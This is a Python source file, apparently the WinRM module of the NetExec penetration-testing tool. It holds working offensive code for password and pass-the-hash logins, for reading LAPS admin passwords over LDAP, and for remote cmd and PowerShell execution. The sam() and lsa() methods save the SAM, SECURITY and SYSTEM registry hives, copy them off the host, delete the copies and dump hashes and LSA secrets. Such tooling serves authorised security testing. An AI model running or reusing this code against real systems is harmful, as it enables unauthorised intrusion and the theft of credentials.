import binascii
import hashlib
import os
import requests
import urllib3
import contextlib
import xml.etree.ElementTree as ET

from io import StringIO
from datetime import datetime
from pypsrp.wsman import NAMESPACES
from pypsrp.client import Client

from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes

from nxc.config import process_secret
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.protocols.ldap.laps import LDAPConnect, LAPSv2Extract
from nxc.logger import NXCAdapter


urllib3.disable_warnings()

class winrm(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.output_filename = None
        self.endpoint = None
        self.hash = None
        self.lmhash = ""
        self.nthash = ""
        self.ssl = False

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "WINRM",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def enum_host_info(self):
        # smb no open, specify the domain
        if self.args.no_smb:
            self.domain = self.args.domain
        else:
            smb_conn = SMBConnection(self.host, self.host, None, timeout=5)
            no_ntlm = False
            try:
                smb_conn.login("", "")
            except BrokenPipeError:
                self.logger.fail("Broken Pipe Error while attempting to login")
            except Exception as e:
                if "STATUS_NOT_SUPPORTED" in str(e):
                    # no ntlm supported
                    no_ntlm = True

            self.domain = smb_conn.getServerDNSDomainName() if not no_ntlm else self.args.domain
            self.hostname = smb_conn.getServerName() if not no_ntlm else self.host
            self.server_os = smb_conn.getServerOS()
            if isinstance(self.server_os.lower(), bytes):
                self.server_os = self.server_os.decode("utf-8")

            self.logger.extra["hostname"] = self.hostname

            self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}")

            with contextlib.suppress(Exception):
                smb_conn.logoff()

            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

            if self.server_os is None:
                self.server_os = ""
            if self.domain is None:
                self.domain = ""

            self.db.add_host(self.host, self.port, self.hostname, self.domain, self.server_os)

        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

    def laps_search(self, username, password, ntlm_hash, domain):
        ldapco = LDAPConnect(self.domain, "389", self.domain)

        if self.kerberos:
            if self.kdcHost is None:
                self.logger.fail("Add --kdcHost parameter to use laps with kerberos")
                return False

            connection = ldapco.kerberos_login(
                domain,
                username[0] if username else "",
                password[0] if password else "",
                ntlm_hash[0] if ntlm_hash else "",
                kdcHost=self.kdcHost,
                aesKey=self.aesKey,
            )
        else:
            connection = ldapco.auth_login(
                domain,
                username[0] if username else "",
                password[0] if password else "",
                ntlm_hash[0] if ntlm_hash else "",
            )
        if not connection:
            self.logger.fail(f"LDAP connection failed with account {username[0]}")
            return False

        search_filter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=" + self.hostname + "))"
        attributes = [
            "msLAPS-EncryptedPassword",
            "msLAPS-Password",
            "ms-MCS-AdmPwd",
            "sAMAccountName",
        ]
        results = connection.search(searchFilter=search_filter, attributes=attributes, sizeLimit=0)

        msMCSAdmPwd = ""
        sAMAccountName = ""
        username_laps = ""

        from impacket.ldap import ldapasn1 as ldapasn1_impacket

        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]
        if len(results) != 0:
            for host in results:
                values = {str(attr["type"]).lower(): attr["vals"][0] for attr in host["attributes"]}
                if "mslaps-encryptedpassword" in values:
                    from json import loads

                    msMCSAdmPwd = values["mslaps-encryptedpassword"]
                    d = LAPSv2Extract(bytes(msMCSAdmPwd), username[0] if username else "", password[0] if password else "", domain, ntlm_hash[0] if ntlm_hash else "", self.args.kerberos, self.args.kdcHost, 339)
                    data = d.run()
                    r = loads(data)
                    msMCSAdmPwd = r["p"]
                    username_laps = r["n"]
                elif "mslaps-password" in values:
                    from json import loads

                    r = loads(str(values["mslaps-password"]))
                    msMCSAdmPwd = r["p"]
                    username_laps = r["n"]
                elif "ms-mcs-admpwd" in values:
                    msMCSAdmPwd = str(values["ms-mcs-admpwd"])
                else:
                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")
            self.logger.debug(f"Host: {sAMAccountName:<20} Password: {msMCSAdmPwd} {self.hostname}")
        else:
            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
            return False

        self.username = username_laps if username_laps else self.args.laps
        self.password = msMCSAdmPwd

        if msMCSAdmPwd == "":
            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
            return False
        if ntlm_hash:
            hash_ntlm = hashlib.new("md4", msMCSAdmPwd.encode("utf-16le")).digest()
            self.hash = binascii.hexlify(hash_ntlm).decode()

        self.domain = self.hostname
        return True

    def print_host_info(self):
        if self.args.domain:
            self.logger.extra["protocol"] = "HTTPS" if self.ssl else "HTTP"
            self.logger.display(self.endpoint)
        else:
            self.logger.extra["protocol"] = "SMB"
            self.logger.extra["port"] = "445"
            self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
            self.logger.extra["protocol"] = "HTTPS" if self.ssl else "HTTP"
            self.logger.extra["port"] = self.port
            self.logger.display(self.endpoint)

        if self.args.laps:
            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
        return True

    def create_conn_obj(self):
        if self.is_link_local_ipv6:
            self.logger.info("winrm not support link-local ipv6, exitting...")
            return False
        endpoints = {
            "HTTP": {
                "protocol": "http", 
                "port": self.port[0],
                "ssl": False
            },
            "HTTPS": {
                "protocol": "https", 
                "port": self.port[1] if len(self.port) != 1 else self.port[0],
                "ssl": True
            }
        }

        if "http" not in self.args.check_proto:
            endpoints.pop("HTTP")
        if "https" not in self.args.check_proto:
            endpoints.pop("HTTPS")

        for protocol in endpoints:
            self.port = endpoints[protocol]["port"]
            url = "{}://{}:{}/wsman".format(
                endpoints[protocol]["protocol"],
                self.host if not self.is_ipv6 else f"[{self.host}]",
                self.port
            )
            try:
                self.logger.debug(f"Requesting URL: {url}")
                res = requests.post(url, verify=False, timeout=self.args.http_timeout) 
                self.logger.debug(f"Received response code: {res.status_code}")
                self.endpoint = url
                self.ssl = endpoints[protocol]["ssl"]
                self.logger.extra["port"] = self.port
                return True
            except requests.exceptions.Timeout as e:
                self.logger.info(f"Connection Timed out to WinRM service: {e}")
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded with url" in str(e):
                    self.logger.info("Connection Timeout to WinRM service (max retries exceeded)")
                else:
                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
        return False
    
    def check_if_admin(self):
        wsman = self.conn.__getstate__()["wsman"]
        wsen = NAMESPACES["wsen"]
        wsmn = NAMESPACES["wsman"]

        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"

        wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
        self.admin_privs = True
        return True
        
    def plaintext_login(self, domain, username, password):
        self.admin_privs = False
        if not self.args.laps:
            self.password = password
            self.username = username
        self.domain = domain

        try:
            self.conn = Client(
                self.host,
                auth="ntlm",
                username=f"{self.username}@{self.domain.upper()}",
                password=self.password,
                ssl=self.ssl,
                cert_validation=False,
            )

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            user_id = self.db.add_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)
            self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True
        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()} '{e}'")

            return False

    def hash_login(self, domain, username, ntlm_hash):
        self.admin_privs = False
        lmhash = "00000000000000000000000000000000"
        nthash = ""
        if not self.args.laps:
            self.username = username
            # This checks to see if we didn't provide the LM Hash
            if ntlm_hash.find(":") != -1:
                lmhash, nthash = ntlm_hash.split(":")
            else:
                nthash = ntlm_hash
        else:
            nthash = self.hash
        self.lmhash = lmhash
        self.nthash = nthash

        try:
            self.domain = domain
            self.conn = Client(
                self.host,
                auth="ntlm",
                username=f"{self.username}@{self.domain.upper()}",
                password=f"{self.lmhash}:{self.nthash}",
                ssl=self.ssl,
                cert_validation=False,
            )

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")

            user_id = self.db.add_credential("hash", domain, self.username, nthash)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)
            self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "with ntlm" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} '{e}'")
            return False

    def execute(self, payload=None, get_output=True, shell_type="cmd"):
        if not payload:
            payload = self.args.execute

        if self.args.no_output:
            get_output = False

        try:
            result = self.conn.execute_cmd(payload, encoding=self.args.codec) if shell_type == "cmd" else self.conn.execute_ps(payload)
        except Exception as e:
            # Reference: https://github.com/diyan/pywinrm/issues/275
            if hasattr(e, "code") and e.code == 5:
                self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")
                
                if shell_type == "cmd":
                    self.logger.info("Cannot execute command, probably has not invoke rights with Root WinRM listener, now auto switch to PSSession!")
                    self.execute(payload, get_output, shell_type="powershell")
            elif ("decode" in str(e)) and not get_output:
                self.logger.success(f"Executed command (shell type: {shell_type})")
            else:
                self.logger.fail(f"Execute command failed, error: '{e}'")
        else:
            self.logger.success(f"Executed command (shell type: {shell_type})")
            buf = StringIO(result[0]).readlines() if get_output else ""
            for line in buf:
                self.logger.highlight(line.strip())

    def ps_execute(self):
        self.execute(payload=self.args.ps_execute, get_output=True, shell_type="powershell")

    def sam(self):
        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
        self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
        self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")

        local_operations = LocalOperations(f"{self.output_filename}.system")
        boot_key = local_operations.getBootKey()
        SAM = SAMHashes(
            f"{self.output_filename}.sam",
            boot_key,
            isRemote=None,
            perSecretCallback=lambda secret: self.logger.highlight(secret),
        )
        SAM.dump()
        SAM.export(f"{self.output_filename}.sam")

    def lsa(self):
        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
        self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
        self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
        self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")

        local_operations = LocalOperations(f"{self.output_filename}.system")
        boot_key = local_operations.getBootKey()
        LSA = LSASecrets(
            f"{self.output_filename}.security",
            boot_key,
            None,
            isRemote=None,
            perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
        )
        LSA.dumpCachedHashes()
        LSA.dumpSecrets()